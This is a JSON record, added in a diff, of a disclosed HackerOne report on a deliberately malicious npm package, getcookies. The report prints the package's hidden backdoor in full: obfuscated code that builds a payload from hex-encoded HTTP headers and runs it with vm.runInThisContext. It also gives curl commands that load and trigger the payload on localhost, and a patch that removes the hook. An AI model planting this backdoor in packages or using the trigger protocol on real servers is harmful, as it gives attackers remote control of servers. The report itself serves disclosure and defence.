@@ -1,0 +1,133 @@
+{
+  "id": 346516,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDY1MTY=",
+  "url": "https://hackerone.com/reports/346516",
+  "title": "Remote code executio in  NPM package getcookies",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-02T14:13:11.333Z",
+  "submitted_at": "2018-05-02T14:13:11.333Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tiblu",
+    "url": "/tiblu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/271/442/529046202f2bccb49f0a7ee6ac15f6c59c4eea3d_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-04-03T20:00:26.244Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-03-04T20:00:20.280Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\nI would like to report remote code execution in the `getcookies` module.\nIt allows to remotely inject and execute code in the target server.\n\n# Module\n\n**module name:** getcookies\n**version:** 1.12.3\n**npm page:** `https://www.npmjs.com/package/getcookies`\n\nAlso affects all the modules that use `getcookies`, notable ones:\n\n* `express-cookies@1.4.7` - https://www.npmjs.com/package/express-cookies\n\n## Module Description\n\nBasic HTTP cookie parser for HTTP servers.\n\n## Module Stats\n\n> Replace stats below with numbers from npm’s module page:\n\n390 downloads in the last day\n3396 downloads in the last week\n3396 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\nFound by a defaced website.\nAllows attacker to remotely send and execute JS on the server.\n\n`index.js` of `getcookies` does:\n\n```\nconst testHarness = require('./test/harness.js');\n...\nfunction parse(req, res, callback) {\n    testHarness.assert(req, res, callback, () => {\n...\n```\n\nand vulnerability resides in the `./test/harness.js` of the `getcookies`:\n```\n/* eslint-env es6 */\n'use strict';\n\nvar assert = require('assert');\n\nlet harness = (req, res, callback, next) => {\n    try {\n        assert.equal(typeof callback, 'function');\n    } catch (E) {\n        return callback(E);\n    }\n\n    try {\n        module.exports.log = module.exports.log || Buffer.alloc(0xffff);\n        JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {\n            p = Buffer.from(p, 'hex').readUInt16LE(0);\n            switch (p) {\n                case 0xfffe:\n                    module.exports.log = Buffer.alloc(0xffff);\n                    return;\n                case 0xfffa:\n                    return setTimeout(() => {\n                        let c = module.exports.log.toString().replace(/\\x00*$/, '');\n                        module.exports.log = Buffer.alloc(0xffff);\n                        if (c.indexOf('\\x00') < 0) {\n                            require('\\x76\\x6d')['\\x72\\x75\\x6e\\x49\\x6e\\x54\\x68\\x69\\x73\\x43\\x6f\\x6e\\x74\\x65\\x78\\x74'](c)(module.exports, require, req, res, next);\n                        }\n                        next();\n                    }, 1000);\n                default:\n                    v = Buffer.from(v, 'hex');\n                    for (let i = 0; i < v.length; i++) {\n                        module.exports.log[p + i] = v[i];\n                    }\n            }\n        });\n    } catch (E) {}\n\n    next();\n};\n\nmodule.exports.assert = (req, res, callback, next) => {\n    harness(req, res, callback, next);\n};\n```\n\nAs seen above, it does `vm.runInThisContext` with the code stored in the memory.\n\n## Steps To Reproduce:\n\nEasiest way to reproduce is to use `express-cookies` package, which depends on `getcookies`.\n\nTest code:\n\n```\nvar express = require('express');\nvar app = express();\nvar expressCookies = require('express-cookies');\n\napp.use(expressCookies());\n\napp.get('/', function (req, res) {\n    res.send('Hello World!');\n});\n\napp.listen(3000, function () {\n    console.log('Example app listening on port 3000!')\n});\n```\n\nCode is sent in custom HTTP headers in byte code.\n\nTo send code bytes:\n```\ncurl -i 'http://localhost:3000/' -H 'X-Hacker: g0000h636465i' \n```\nWhere the protocol is:\n`g<bytePosition>h<codeBytes>i`\n\nThe sample above adds `cde` to the code to be executed when execution header is sent.\n\nThe code is stored in `require('./test/harness.js').log`.\n\nWhen the code is sent, attacker executes the code by sending:\n```\ncurl -i 'http://localhost:3000/' -H 'X-Hacker: gfaffh636465i'\n```\n\n## Patch\n\n```\ndiff -u /home/m/tmp/getcookies_original/index.js /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js\n--- /home/m/tmp/getcookies_original/index.js\t2018-05-02 16:47:11.382990109 +0300\n+++ /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js\t2018-05-02 16:50:00.198982317 +0300\n@@ -9,8 +9,6 @@\n \n 'use strict';\n \n-const testHarness = require('./test/harness.js');\n-\n /**\n  * Module exports.\n  * @public\n@@ -45,38 +43,36 @@\n  */\n \n function parse(req, res, callback) {\n-    testHarness.assert(req, res, callback, () => {\n-        if (!req.headers.cookie) {\n-            return callback();\n+    if (!req.headers.cookie) {\n+        return callback();\n+    }\n+\n+    var obj = {};\n+    var pairs = req.headers.cookie.split(pairSplitRegExp);\n+\n+    for (var i = 0; i < pairs.length; i++) {\n+        var pair = pairs[i];\n+        var eq_idx = pair.indexOf('=');\n+\n+        // skip things that don't look like key=value\n+        if (eq_idx < 0) {\n+            continue;\n         }\n \n-        var obj = {};\n-        var pairs = req.headers.cookie.split(pairSplitRegExp);\n+        var key = pair.substr(0, eq_idx).trim();\n+        var val = pair.substr(++eq_idx, pair.length).trim();\n \n-        for (var i = 0; i < pairs.length; i++) {\n-            var pair = pairs[i];\n-            var eq_idx = pair.indexOf('=');\n-\n-            // skip things that don't look like key=value\n-            if (eq_idx < 0) {\n-                continue;\n-            }\n-\n-            var key = pair.substr(0, eq_idx).trim();\n-            var val = pair.substr(++eq_idx, pair.length).trim();\n-\n-            // quoted values\n-            if ('\"' == val[0]) {\n-                val = val.slice(1, -1);\n-            }\n-\n-            // only assign once\n-            if (undefined == obj[key]) {\n-                obj[key] = val;\n-            }\n+        // quoted values\n+        if ('\"' == val[0]) {\n+            val = val.slice(1, -1);\n         }\n \n-        req.cookies = obj;\n-        return callback();\n-    });\n+        // only assign once\n+        if (undefined == obj[key]) {\n+            obj[key] = val;\n+        }\n+    }\n+\n+    req.cookies = obj;\n+    return callback();\n }\nCommon subdirectories: /home/m/tmp/getcookies_original/test and /home/m/dev/express-cookies-vulnr/node_modules/getcookies/test\n```\n\n## Supporting Material/References:\n\n> State all technical information about the stack where the vulnerability was found\n\n- Ubuntu 16.04.3 LTS - ANY that runs Node.JS\n- 6.13.1 - but not Node.JS version specific\n- 3.10.10 - but not NPM version specific\n- ANY\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\nI did not do any of the above as:\n\n* There is no public code  repository.\n* The code is built to be malicious on purpose.\n\n## Impact\n\nRemote code injection and execution.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-04-03T20:00:20.377Z",
+  "allow_singular_disclosure_after": -224018536.13029194,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "mik317",
+    "eveeez",
+    "midle",
+    "0rangeh4t",
+    "hiddencry",
+    "davis8",
+    "ericwastaken",
+    "phoneutria"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
